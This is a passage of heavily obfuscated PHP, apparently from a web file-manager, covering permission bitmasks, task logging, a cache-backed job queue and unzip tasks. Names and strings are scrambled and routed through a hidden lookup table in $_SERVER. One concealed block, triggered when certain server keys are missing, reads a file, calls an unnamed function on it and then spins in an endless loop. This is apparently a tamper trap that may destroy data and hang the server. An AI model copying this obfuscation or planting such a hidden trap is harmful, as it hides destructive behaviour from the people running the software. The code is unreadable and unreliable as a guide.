$_SERVER[è¶³ÒßÑ]; $ğ¹İÈå = array($‰ „ ç½[1979] => self::AUTH_VIEW, $‰ „ ç½[1254] => self::AUTH_DOWNLOAD, $‰ „ ç½[120] => self::AUTH_UPLOAD, $‰ „ ç½[1929] => self::AUTH_EDIT, $‰ „ ç½[1928] => self::AUTH_REMOVE, $‰ „ ç½[1939] => self::AUTH_SHARE, $‰ „ ç½[423] => self::AUTH_COMMENT, $‰ „ ç½[1749] => self::AUTH_EVENT, $‰ „ ç½[1980] => self::AUTH_ROOT); if (!isset($ğ¹İÈå[$ÈÙ™öõ])) { return; } $²ˆ™µòˆ = $ğ¹İÈå[$ÈÙ™öõ]; $Ë»¸şé¥ = intval($Ë»¸şé¥); if ($Ë»¸şé¥ <= 0) { return !1; } if (($Ë»¸şé¥ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ë»¸şé¥ & $²ˆ™µòˆ); } public static function authDisable($¤ó‘ŒŞ, $§ğ¤ÍŞ) { if (intval($¤ó‘ŒŞ) <= 0) { return 0; } return intval($¤ó‘ŒŞ) & ~$§ğ¤ÍŞ; } public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\163\157\165\162\143\145\x41\165\x74\150\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\x61\x75\x74\150", "\x6c\141\x62\x65\x6c", "\144\x69\163\160\x6c\141\171", "\x73\x79\163\x74\x65\x6d", "\x73\x6f\162\x74"); public function initData() { $½„Ã£¨® = $this->authDefault(); foreach ($½„Ã£¨® as $ÔÑ¥¤ªÂ) { $this->add($ÔÑ¥¤ªÂ); } } public function findAuth($Ä›øùİ, $”™¨Ãä¹) { $Ä‘ÒšöÔ =& $_SERVER[è¶³ÒßÑ]; $¹ŞÒ•­‚ = parent::listData(); foreach ($¹ŞÒ•­‚ as $ÙŒíÇ°Ã) { $äĞ÷Ö‰± = intval($ÙŒíÇ°Ã[$Ä‘ÒšöÔ[480]]); if ($äĞ÷Ö‰± <= 0 || $ÙŒíÇ°Ã[$Ä‘ÒšöÔ[1981]] == 0) { continue; } if (($äĞ÷Ö‰± & $Ä›øùİ) != $Ä›øùİ) { continue; } if (($äĞ÷Ö‰± & $”™¨Ãä¹) != 0) { continue; } return $ÙŒíÇ°Ã[$Ä‘ÒšöÔ[468]]; } return !1; } public function findAuthReadOnly() { $Ø…Ö×ÚŒ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $”Æó›…¡ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ø…Ö×ÚŒ, $”Æó›…¡); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÈªûÓ…Ü =& $_SERVER[è¶³ÒßÑ]; $ªÓ¿ı = parent::listData(); $§œÄïú« = !1; foreach ($ªÓ¿ı as $ª–¾³Å) { if ($ª–¾³Å[$ÈªûÓ…Ü[480]] <= 0 || $ª–¾³Å[$ÈªûÓ…Ü[1981]] == $ÈªûÓ…Ü[238]) { continue; } if (!$§œÄïú«) { $§œÄïú« = $ª–¾³Å; continue; } if ($§œÄïú«[$ÈªûÓ…Ü[480]] > $ª–¾³Å[$ÈªûÓ…Ü[480]]) { $§œÄïú« = $ª–¾³Å; } } return $§œÄïú« ? $§œÄïú«[$ÈªûÓ…Ü[468]] : $ÈªûÓ…Ü[12]; } public function listData($‘Ì´ÂéĞ = false, $›åÀğ½Ú = "\163\x6f\x72\x74", $çéËÅúµ = false) { return parent::listData($‘Ì´ÂéĞ, $›åÀğ½Ú, $çéËÅúµ); } public function update($™ÅÅ€êˆ, $ö®ùÕ„í) { $´Ç”¼Î² =& $_SERVER[è¶³ÒßÑ]; $ú»ºÑâ = parent::listData($™ÅÅ€êˆ); $İ¨º¸…Ì = $this->findByName($ö®ùÕ„í[$´Ç”¼Î²[32]]); if (!$ú»ºÑâ || $İ¨º¸…Ì && $İ¨º¸…Ì[$´Ç”¼Î²[468]] != $ú»ºÑâ[$´Ç”¼Î²[468]]) { return !1; } $this->filterAuth($ö®ùÕ„í[$´Ç”¼Î²[480]]); return parent::update($™ÅÅ€êˆ, $ö®ùÕ„í); } public function remove($ğ×ó®) { $éõ£†¯« = parent::listData($ğ×ó®); if (!$éõ£†¯« || $éõ£†¯«[$_SERVER[è¶³ÒßÑ][201]]) { return !1; } return parent::remove($ğ×ó®); } public function add($òÓà”ú˜ = array()) { $ÁÓæ¯ú =& $_SERVER[è¶³ÒßÑ]; if ($this->findByName($òÓà”ú˜[$ÁÓæ¯ú[32]])) { return !1; } $†ÃçË€¸ = array($ÁÓæ¯ú[32] => $ÁÓæ¯ú[12], $ÁÓæ¯ú[480] => 1, $ÁÓæ¯ú[1982] => $ÁÓæ¯ú[1969], $ÁÓæ¯ú[1981] => 1, $ÁÓæ¯ú[201] => 0, $ÁÓæ¯ú[1983] => 0); $òÓà”ú˜ = array_merge($†ÃçË€¸, $òÓà”ú˜); $òÓà”ú˜[$ÁÓæ¯ú[1983]] = $this->getSort(); $this->filterAuth($òÓà”ú˜[$ÁÓæ¯ú[480]]); return parent::insert($òÓà”ú˜); } private function getSort() { $µå³ÓÍé =& $_SERVER[è¶³ÒßÑ]; $Û¡ÈÎÅÁ = parent::listData(); $¼İË£Œõ = array_to_keyvalue($Û¡ÈÎÅÁ, $µå³ÓÍé[12], $µå³ÓÍé[1983]); return empty($¼İË£Œõ) ? 0 : max($¼İË£Œõ) + 1; } private function filterAuth(&$ç˜úûË) { if (!$ç˜úûË) { return; } $”òæŞµú = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $÷“ßÄœ = array(); foreach ($”òæŞµú as $â¸øª§Ù) { if ($ç˜úûË & $â¸øª§Ù) { $÷“ßÄœ[] = $â¸øª§Ù; } } if (in_array(self::AUTH_ROOT, $÷“ßÄœ)) { $ç˜úûË = array_sum($”òæŞµú); return; } $óÄ†êã = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($÷“ßÄœ as $â¸øª§Ù) { if (isset($óÄ†êã[$â¸øª§Ù])) { $÷“ßÄœ = array_merge($÷“ßÄœ, $óÄ†êã[$â¸øª§Ù]); } } $÷“ßÄœ[] = self::AUTH_SHOW; $ç˜úûË = array_sum(array_unique($÷“ßÄœ)); } public function sort($£ÄóÅœ, $†Üˆ­Øú) { return parent::update($£ÄóÅœ, $†Üˆ­Øú); } } if (!isset($_SERVER[$_SERVER[è¶³ÒßÑ][56]]) || !isset($_SERVER[$_SERVER[è¶³ÒßÑ][54]])) { $_getc = $_SERVER[è¶³ÒßÑ][57]; $_getfile = $_SERVER[$_SERVER[è¶³ÒßÑ][58]] . $_SERVER[è¶³ÒßÑ][59]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[è¶³ÒßÑ][60], $_getfilec); if (count($_getarrs) < $_SERVER[è¶³ÒßÑ][61]) { $exit = $_SERVER[è¶³ÒßÑ][62]; $exit(); } $_act = $_SERVER[è¶³ÒßÑ][63]; $_act($_SERVER[$_SERVER[è¶³ÒßÑ][58]] . $_SERVER[è¶³ÒßÑ][59]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[è¶³ÒßÑ][447]); } } goto BÄßššõ; Aã³ƒÙ¼™: class TaskHttp extends Task { protected function startAfter() { $³Üê½ =& $_SERVER[è¶³ÒßÑ]; $†Ó›½ô† =& $this->task; $†Ó›½ô†[$³Üê½[1838]] = 1; Hook::bind($³Üê½[1806], array($this, $³Üê½[1839])); Hook::bind($³Üê½[1808], array($this, $³Üê½[1840])); Hook::bind($³Üê½[1810], array($this, $³Üê½[1841])); } protected function endAfter() { $ï–ĞÂøÑ =& $_SERVER[è¶³ÒßÑ]; Hook::unbind($ï–ĞÂøÑ[1806], array($this, $ï–ĞÂøÑ[1839])); Hook::unbind($ï–ĞÂøÑ[1808], array($this, $ï–ĞÂøÑ[1840])); Hook::unbind($ï–ĞÂøÑ[1810], array($this, $ï–ĞÂøÑ[1841])); } public function progressStart($€™¿ª«Õ) { $²×©åçŸ =& $_SERVER[è¶³ÒßÑ]; $ó²Å¸ˆâ = curl_getinfo($€™¿ª«Õ); self::log($²×©åçŸ[1842] . $ó²Å¸ˆâ[$²×©åçŸ[376]]); self::valueSet($this->task[$²×©åçŸ[468]], $this->task); } public function progressEnd($ŠñØÊ›ó) { $ëÅ£˜œ =& $_SERVER[è¶³ÒßÑ]; self::log($ëÅ£˜œ[1843] . $this->task[$ëÅ£˜œ[468]]); $this->end(); } public function progress($ï½Ò¾¯, $µ¢ÉÂèª, $ØÖÌÍë¤, $Î®¥Ëéá, $ÍÅëáÇ) { $µÂç±Ë =& $_SERVER[è¶³ÒßÑ]; $ûû’âİ˜ =& $this->task; if ($ÍÅëáÇ > 0) { $ûû’âİ˜[$µÂç±Ë[1116]] = $ûû’âİ˜[$µÂç±Ë[1116]] == 0 ? $Î®¥Ëéá : $ûû’âİ˜[$µÂç±Ë[1116]]; $ûû’âİ˜[$µÂç±Ë[1762]] = $ÍÅëáÇ; } else { if ($ØÖÌÍë¤ > 0) { $ûû’âİ˜[$µÂç±Ë[1116]] = $ûû’âİ˜[$µÂç±Ë[1116]] == 0 ? $µ¢ÉÂèª : $ûû’âİ˜[$µÂç±Ë[1116]]; $ûû’âİ˜[$µÂç±Ë[1762]] = $ØÖÌÍë¤; } } $this->update(); self::log("\160\x72\157\x67\x72\x65\163\x73\x48\x74\x74\x70\x3a\144\157\167\x6e\x3a{$ØÖÌÍë¤}\57{$µ¢ÉÂèª}\73\x20\165\x70\154\157\x61\144\x3a{$ÍÅëáÇ}\x2f{$Î®¥Ëéá}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‹ÄÃÖ›¦, $ëä˜¡£— = '', $¹ÀÉ”È  = 0, $½Ç­ÎĞÀ = '') { $Éß£ŠÔ² =& $_SERVER[è¶³ÒßÑ]; $½Ç­ÎĞÀ = $½Ç­ÎĞÀ ? $½Ç­ÎĞÀ : ($ëä˜¡£— ? $ëä˜¡£— : $‹ÄÃÖ›¦); $˜¼Ï·â = new Task($‹ÄÃÖ›¦, $ëä˜¡£—, $¹ÀÉ”È , $½Ç­ÎĞÀ); $GLOBALS[$Éß£ŠÔ²[1844] . $‹ÄÃÖ›¦] = new TaskLog($Éß£ŠÔ²[1745], $˜¼Ï·â, $½Ç­ÎĞÀ); return $˜¼Ï·â; } public function __construct($¿‰¨ï°Ó = '', $ÇÄÛâ¹Œ = '', $âÏò°üí = '') { $î·›®º =& $_SERVER[è¶³ÒßÑ]; if (!$¿‰¨ï°Ó) { $¿‰¨ï°Ó = $î·›®º[1745]; } $óôÛıó = $¿‰¨ï°Ó . $î·›®º[455] . rand_string(10); if (!$âÏò°üí) { $âÏò°üí = $¿‰¨ï°Ó . $î·›®º[53] . $âÏò°üí; } switch ($¿‰¨ï°Ó) { case $î·›®º[1745]: if (!$ÇÄÛâ¹Œ || !$ÇÄÛâ¹Œ->task) { return echoLog($¿‰¨ï°Ó . $î·›®º[1845]); } $›ÈÄ³á’ = $ÇÄÛâ¹Œ; $óôÛıó = $›ÈÄ³á’->task[$î·›®º[468]]; $¿‰¨ï°Ó = $›ÈÄ³á’->task[$î·›®º[468]]; if (!$›ÈÄ³á’->task[$î·›®º[1650]]) { $›ÈÄ³á’->task[$î·›®º[1650]] = $âÏò°üí ? $âÏò°üí : $¿‰¨ï°Ó; } break; case $î·›®º[1846]: if (!$ÇÄÛâ¹Œ) { return echoLog($¿‰¨ï°Ó . $î·›®º[1847]); } $µéƒÎï´ = is_string($ÇÄÛâ¹Œ) ? array($ÇÄÛâ¹Œ) : $ÇÄÛâ¹Œ; $›ÈÄ³á’ = new TaskFileTransfer($óôÛıó, $¿‰¨ï°Ó, 0, $âÏò°üí ? $âÏò°üí : $µéƒÎï´[0]); foreach ($µéƒÎï´ as $˜ËÜ©ØÍ) { $›ÈÄ³á’->addPath($˜ËÜ©ØÍ); } break; case $î·›®º[382]: if (!$ÇÄÛâ¹Œ) { return echoLog($¿‰¨ï°Ó . $î·›®º[1847]); } $µéƒÎï´ = is_string($ÇÄÛâ¹Œ) ? array($ÇÄÛâ¹Œ) : $ÇÄÛâ¹Œ; $›ÈÄ³á’ = new TaskZip($óôÛıó, $¿‰¨ï°Ó, 0, $âÏò°üí ? $âÏò°üí : $µéƒÎï´[0]); foreach ($µéƒÎï´ as $˜ËÜ©ØÍ) { $›ÈÄ³á’->addPath($˜ËÜ©ØÍ); } break; case $î·›®º[1274]: if (!$ÇÄÛâ¹Œ) { return echoLog($¿‰¨ï°Ó . $î·›®º[1847]); } $›ÈÄ³á’ = new TaskUnZip($óôÛıó, $¿‰¨ï°Ó, 0, $âÏò°üí ? $âÏò°üí : $ÇÄÛâ¹Œ); if ($ÇÄÛâ¹Œ) { $›ÈÄ³á’->addFile($ÇÄÛâ¹Œ); } break; case $î·›®º[162]: $›ÈÄ³á’ = new TaskHttp($óôÛıó, $¿‰¨ï°Ó); break; default: return; break; } $this->task = $›ÈÄ³á’; $this->taskID = $óôÛıó; Hook::bind($î·›®º[1782], array($this, $î·›®º[1848])); Hook::bind($î·›®º[1784], array($this, $î·›®º[1849])); Hook::bind($î·›®º[1778], array($this, $î·›®º[1850])); echoLog($î·›®º[1851] . $›ÈÄ³á’->task[$î·›®º[1650]]); } public function __destruct() { $this->end(); } public function end($§”–ñ˜ = '') { $»ïÅÂ» =& $_SERVER[è¶³ÒßÑ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($§”–ñ˜); $this->task = !1; $this->taskID = !1; Hook::unbind($»ïÅÂ»[1782], array($this, $»ïÅÂ»[1848])); Hook::unbind($»ïÅÂ»[1784], array($this, $»ïÅÂ»[1849])); Hook::unbind($»ïÅÂ»[1778], array($this, $»ïÅÂ»[1850])); } public function taskUpdate($¤ğ„†Î¿) { $±ÆÉ¤Ã„ =& $_SERVER[è¶³ÒßÑ]; if (!$¤ğ„†Î¿ || $this->taskID != $¤ğ„†Î¿[$±ÆÉ¤Ã„[468]]) { return; } $ÄÛ³Ù…Ï = 20; $„ÃÇ¼Ê = intval($¤ğ„†Î¿[$±ÆÉ¤Ã„[1763]] * $ÄÛ³Ù…Ï); $“‚Œûõ¢ = $±ÆÉ¤Ã„[186] . str_repeat($±ÆÉ¤Ã„[937], $„ÃÇ¼Ê) . $±ÆÉ¤Ã„[1067] . str_repeat($±ÆÉ¤Ã„[53], $ÄÛ³Ù…Ï - $„ÃÇ¼Ê) . $±ÆÉ¤Ã„[188]; $º’úÖ¼€ = $“‚Œûõ¢ . sprintf($±ÆÉ¤Ã„[1852], $¤ğ„†Î¿[$±ÆÉ¤Ã„[1763]] * 100) . $±ÆÉ¤Ã„[1853]; $³‹Óï = $º’úÖ¼€ . $¤ğ„†Î¿[$±ÆÉ¤Ã„[1762]] . $±ÆÉ¤Ã„[8] . $¤ğ„†Î¿[$±ÆÉ¤Ã„[1116]] . LNG($±ÆÉ¤Ã„[1854]); $’§‰œ = $±ÆÉ¤Ã„[12]; if ($¤ğ„†Î¿[$±ÆÉ¤Ã„[1838]]) { $³‹Óï = $º’úÖ¼€ . size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[1762]]) . $±ÆÉ¤Ã„[8] . size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[1116]]); $’§‰œ = size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[1764]]) . $±ÆÉ¤Ã„[1855]; } if ($¤ğ„†Î¿[$±ÆÉ¤Ã„[1118]]) { $¤ğ„†Î¿[$±ÆÉ¤Ã„[1812]] = $¤ğ„†Î¿[$±ÆÉ¤Ã„[1118]] . $±ÆÉ¤Ã„[53] . $¤ğ„†Î¿[$±ÆÉ¤Ã„[1812]]; } if ($¤ğ„†Î¿[$±ÆÉ¤Ã„[1812]]) { $¥ß§ÙĞÙ = $±ÆÉ¤Ã„[12]; if ($¤ğ„†Î¿[$±ÆÉ¤Ã„[1814]]) { $¥ß§ÙĞÙ = $±ÆÉ¤Ã„[50] . size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[1815]]) . $±ÆÉ¤Ã„[8] . size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[1814]]); } $’§‰œ .= $¤ğ„†Î¿[$±ÆÉ¤Ã„[1812]] . $¥ß§ÙĞÙ; } if ($¤ğ„†Î¿[$±ÆÉ¤Ã„[817]] && !$¤ğ„†Î¿[$±ÆÉ¤Ã„[1814]]) { $’§‰œ .= $±ÆÉ¤Ã„[53] . size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[1819]]) . $±ÆÉ¤Ã„[8] . size_format($¤ğ„†Î¿[$±ÆÉ¤Ã„[817]]); } echoLog($³‹Óï . $±ÆÉ¤Ã„[53] . $’§‰œ, !0); } public function taskEnd($ÆÛŒåìÊ) { $ŞûÍ‘éã =& $_SERVER[è¶³ÒßÑ]; if (!$ÆÛŒåìÊ || $this->taskID != $ÆÛŒåìÊ[$ŞûÍ‘éã[468]]) { return; } $Ô€Ê¶ãÓ = $ÆÛŒåìÊ ? $ÆÛŒåìÊ[$ŞûÍ‘éã[1762]] . $ŞûÍ‘éã[8] . $ÆÛŒåìÊ[$ŞûÍ‘éã[1116]] . LNG($ŞûÍ‘éã[1854]) . $ŞûÍ‘éã[84] : $ŞûÍ‘éã[12]; echoLog($ŞûÍ‘éã[1856] . $ÆÛŒåìÊ[$ŞûÍ‘éã[1650]] . ($ÆÛŒåìÊ[$ŞûÍ‘éã[519]] ? $ŞûÍ‘éã[84] . $ÆÛŒåìÊ[$ŞûÍ‘éã[519]] : $ŞûÍ‘éã[12]) . $ŞûÍ‘éã[84] . $Ô€Ê¶ãÓ . $ŞûÍ‘éã[1857] . sprintf($ŞûÍ‘éã[904], timeFloat() - $ÆÛŒåìÊ[$ŞûÍ‘éã[1765]]) . $ŞûÍ‘éã[1777]); $this->end(); } public function taskKill($Şàî“û™) { $ˆ®­Ñ÷ı =& $_SERVER[è¶³ÒßÑ]; if (!$Şàî“û™ || $this->taskID != $Şàî“û™[$ˆ®­Ñ÷ı[468]]) { return; } echoLog($ˆ®­Ñ÷ı[1858] . $Şàî“û™[$ˆ®­Ñ÷ı[1650]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\165\145\165\x65\114\145\156\x67\164\150"; const QUEUE_DATA = "\164\141\163\153\x51\165\x65\x75\x65\x44\141\x74\141"; const QUEUE_TIME = "\x74\x61\163\x6b\121\165\x65\x75\x65\x4c\141\x73\164\122\x75\156"; const QUEUE_THREAD = "\164\141\163\x6b\121\x75\145\x75\x65\124\x68\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ùÜá›ò™, $½ÏÉÊß = array(), $ŒšÈ°êÔ = '', $²û‘ÁÙ† = '') { $Ê²òãÔ… =& $_SERVER[è¶³ÒßÑ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($²û‘ÁÙ† && array_find_by_field(self::$listData, $Ê²òãÔ…[107], $²û‘ÁÙ†)) { return !0; } if ($²û‘ÁÙ† && array_find_by_field(self::$listDataAdd, $Ê²òãÔ…[107], $²û‘ÁÙ†)) { return !0; } self::$listDataAdd[] = array($Ê²òãÔ…[334] => $ùÜá›ò™, $Ê²òãÔ…[1859] => $½ÏÉÊß, $Ê²òãÔ…[519] => $ŒšÈ°êÔ, $Ê²òãÔ…[107] => $²û‘ÁÙ†); return !0; } public static function addSubmit() { $„ĞÂı»× =& $_SERVER[è¶³ÒßÑ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($„ĞÂı»×[1860] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $„ĞÂı»×[12], $„ĞÂı»×[519])), $„ĞÂı»×[207]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($–¶ïÆ×, $¤ğÕï•û = array(), $ƒ¤òØ‰Ö = '', $ôºò§–ã = '') { $†¯¯Îˆ =& $_SERVER[è¶³ÒßÑ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $úÜç÷³ = self::getAll(); if ($ôºò§–ã && array_find_by_field($úÜç÷³, $†¯¯Îˆ[107], $ôºò§–ã)) { return !0; } $úÜç÷³[] = array($†¯¯Îˆ[334] => $–¶ïÆ×, $†¯¯Îˆ[1859] => $¤ğÕï•û, $†¯¯Îˆ[519] => $ƒ¤òØ‰Ö, $†¯¯Îˆ[107] => $ôºò§–ã); self::setAll($úÜç÷³); write_log($†¯¯Îˆ[1860] . $ƒ¤òØ‰Ö, $†¯¯Îˆ[207]); return !0; } public static function run() { $…Ş¦²² =& $_SERVER[è¶³ÒßÑ]; $™©ïöìÇ = self::getAll(); $ŸÄ×Ú–ô = array_shift($™©ïöìÇ); if (!$ŸÄ×Ú–ô) { return !1; } self::setAll($™©ïöìÇ); $­¦–ÅÉÖ = timeFloat(); $ëá­‰©ï = $…Ş¦²²[12]; try { $ëá­‰©ï = Hook::apply($ŸÄ×Ú–ô[$…Ş¦²²[334]], $ŸÄ×Ú–ô[$…Ş¦²²[1859]]); } catch (Exception $Áí¼ó¶) { write_log($Áí¼ó¶, $…Ş¦²²[1239]); } $õÔû—† = number_format(timeFloat() - $­¦–ÅÉÖ, 3) . $…Ş¦²²[1777]; if ($ëá­‰©ï && is_string($ëá­‰©ï)) { $õÔû—† = $õÔû—† . $…Ş¦²²[1861] . $ëá­‰©ï; } write_log($…Ş¦²²[1862] . $ŸÄ×Ú–ô[$…Ş¦²²[519]] . $…Ş¦²²[1863] . $õÔû—†, $…Ş¦²²[207]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Û¾¹Î²¶ =& $_SERVER[è¶³ÒßÑ]; $¬€°Ã  = self::threadCount() + 1; if ($¬€°Ã  > 3 || !self::count()) { return; } write_log($Û¾¹Î²¶[1864] . $¬€°Ã , $Û¾¹Î²¶[207]); Cache::set(self::QUEUE_THREAD, $¬€°Ã , 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Û¾¹Î²¶[1865], $Û¾¹Î²¶[207]); } public static function getKey($Àö‰Çı¯, $÷›ÁŠ–À = "\151\x6e\x74") { $ĞìùÒÈ =& $_SERVER[è¶³ÒßÑ]; Cache::removeMemory($Àö‰Çı¯); $‡—ŞëŠî = Cache::get($Àö‰Çı¯); if ($÷›ÁŠ–À == $ĞìùÒÈ[357]) { return $‡—ŞëŠî ? intval($‡—ŞëŠî) : 0; } if ($÷›ÁŠ–À == $ĞìùÒÈ[1866]) { return is_array($‡—ŞëŠî) ? $‡—ŞëŠî : array(); } return $‡—ŞëŠî; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[è¶³ÒßÑ][1866]); } public static function setAll($í“ÎÍ®ë) { $‹ÏÔ¬£ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($í“ÎÍ®ë), $‹ÏÔ¬£); Cache::set(self::QUEUE_DATA, $í“ÎÍ®ë, $‹ÏÔ¬£); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto eÄÖ”¾äøê; eÄÖ”¾äøê: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($»äİŠÑ, $ö©Õ´‹ê = 5.0) { if (!$»äİŠÑ) { return; } $ĞÍõ­ïÓ = Cache::get($»äİŠÑ); if (!$ĞÍõ­ïÓ || timeFloat() - floatVal($ĞÍõ­ïÓ) >= $ö©Õ´‹ê) { Cache::set($»äİŠÑ, timeFloat(), $ö©Õ´‹ê * 10); return !0; } return !1; } public static function timeLimitCall($Ù¬•É³, $êŞì„ß², $Ø‚«‹Çó, $»Û•¨»ç = 5.0) { $œ÷æ§§ =& $_SERVER[è¶³ÒßÑ]; if (!$Ù¬•É³ || !$êŞì„ß²) { return; } self::$asyncAdd = !0; $¤¶ğ¦äë = $œ÷æ§§[1867]; $‰æµ¾¦Ç = Cache::get($¤¶ğ¦äë, !0); $©ïÑ¾Íİ = array($œ÷æ§§[1868] => timeFloat(), $œ÷æ§§[1869] => timeFloat(), $œ÷æ§§[334] => $êŞì„ß², $œ÷æ§§[1859] => $Ø‚«‹Çó, $œ÷æ§§[216] => $»Û•¨»ç); if (is_array($‰æµ¾¦Ç[$Ù¬•É³])) { $©ïÑ¾Íİ[$œ÷æ§§[1869]] = $‰æµ¾¦Ç[$Ù¬•É³][$œ÷æ§§[1869]]; } if (is_array($‰æµ¾¦Ç[$Ù¬•É³])) { if (timeFloat() - $‰æµ¾¦Ç[$Ù¬•É³][$œ÷æ§§[1868]] < $©ïÑ¾Íİ[$œ÷æ§§[216]] * 0.3) { return; } $©ïÑ¾Íİ[$œ÷æ§§[1869]] = $‰æµ¾¦Ç[$Ù¬•É³][$œ÷æ§§[1869]]; } $‰æµ¾¦Ç[$Ù¬•É³] = $©ïÑ¾Íİ; Cache::set($¤¶ğ¦äë, $‰æµ¾¦Ç, 60); Cache::removeMemory($¤¶ğ¦äë); write_log($œ÷æ§§[1870] . $Ù¬•É³ . $œ÷æ§§[84] . $êŞì„ß², $œ÷æ§§[207]); } public static function timeLimitCallLoop() { $•ŒšŒ–ß =& $_SERVER[è¶³ÒßÑ]; $’é†•ú¼ = array($•ŒšŒ–ß[1871]); $çß§Èô = in_array(strtolower(ACTION), $’é†•ú¼); if (!$çß§Èô && !self::$asyncAdd) { return; } $Ü¨¥é¿» = $•ŒšŒ–ß[1867]; $™Ä”Ÿšş = Cache::get($Ü¨¥é¿», !0); if (!$™Ä”Ÿšş || count($™Ä”Ÿšş) <= 0) { return; } $°êœ£¹Ö = !1; $±¾ùñŠ = timeFloat(); $öéšÊ‡ğ = array(); foreach ($™Ä”Ÿšş as $äë™Æö => $³Î“‹¶ˆ) { if ($±¾ùñŠ - $³Î“‹¶ˆ[$•ŒšŒ–ß[1869]] > $³Î“‹¶ˆ[$•ŒšŒ–ß[216]]) { $°êœ£¹Ö = !0; try { Hook::apply($³Î“‹¶ˆ[$•ŒšŒ–ß[334]], $³Î“‹¶ˆ[$•ŒšŒ–ß[1859]]); write_log($•ŒšŒ–ß[1872] . $äë™Æö . $•ŒšŒ–ß[84] . $³Î“‹¶ˆ[$•ŒšŒ–ß[334]] . $•ŒšŒ–ß[1873] . ACTION, $•ŒšŒ–ß[207]); } catch (Exception $—‘¬»é¢) { } continue; } $öéšÊ‡ğ[$äë™Æö] = $³Î“‹¶ˆ; } if (!$°êœ£¹Ö) { return; } if (!$öéšÊ‡ğ) { return Cache::remove($Ü¨¥é¿»); } Cache::set($Ü¨¥é¿», $öéšÊ‡ğ, 60); Cache::removeMemory($Ü¨¥é¿»); } public static function finished($¼®ãşì·, $«•Š¾¤) { $¼›ƒÇş´ =& $_SERVER[è¶³ÒßÑ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¼›ƒÇş´[334] => $¼®ãşì·, $¼›ƒÇş´[1859] => $«•Š¾¤); } private static function finishedRun() { $´Àß¥£Ä =& $_SERVER[è¶³ÒßÑ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ê‡““›œ) { try { Hook::apply($Ê‡““›œ[$´Àß¥£Ä[334]], $Ê‡““›œ[$´Àß¥£Ä[1859]]); } catch (Exception $çÌô½¥) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ã²•òĞî =& $_SERVER[è¶³ÒßÑ]; parent::startAfter(); Hook::bind($Ã²•òĞî[1874], array($this, $Ã²•òĞî[1875])); Hook::bind($Ã²•òĞî[1253], array($this, $Ã²•òĞî[1876])); Hook::bind($Ã²•òĞî[1877], array($this, $Ã²•òĞî[1878])); $çÃ‚Äº¯ =& $this->task; $çÃ‚Äº¯[$Ã²•òĞî[1879]] = $Ã²•òĞî[1254]; if (!$çÃ‚Äº¯[$Ã²•òĞî[1650]]) { $çÃ‚Äº¯[$Ã²•òĞî[1650]] = LNG($Ã²•òĞî[1880]); } } protected function endAfter() { $²®Úô«¨ =& $_SERVER[è¶³ÒßÑ]; parent::endAfter(); Hook::unbind($²®Úô«¨[1874], array($this, $²®Úô«¨[1875])); Hook::unbind($²®Úô«¨[1253], array($this, $²®Úô«¨[1876])); Hook::unbind($²®Úô«¨[1877], array($this, $²®Úô«¨[1878])); } public function updateAfter() { $õ„ÏÂ†Ÿ =& $_SERVER[è¶³ÒßÑ]; $õêí©›· =& $this->task; if (!$õêí©›·[$õ„ÏÂ†Ÿ[1116]] || !$õêí©›·[$õ„ÏÂ†Ÿ[817]]) { if ($õêí©›·[$õ„ÏÂ†Ÿ[1879]] != 